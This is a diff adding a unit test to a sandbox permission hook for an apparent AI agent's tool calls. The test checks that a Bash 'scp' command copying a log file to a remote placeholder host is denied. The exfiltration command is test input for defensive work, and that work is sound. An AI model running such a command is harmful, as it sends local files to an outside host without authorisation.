@@ -132,3 +132,11 @@ def test_build_hooks_returns_correct_structure(tmp_path):
     assert "PostToolUse" in hooks
     assert len(hooks["PreToolUse"]) >= 1
     assert len(hooks["PostToolUse"]) >= 1
+
+
+def test_bash_scp_is_denied(tmp_path):
+    sandbox = tmp_path / "Tickets" / "18432"
+    sandbox.mkdir(parents=True)
+    pre = make_pre_tool_use(sandbox_root=sandbox)
+    result = _run(_call(pre, _pre_event("Bash", {"command": "scp logs/x.log user@host:/tmp/"})))
+    assert result["hookSpecificOutput"]["permissionDecision"] == "deny"
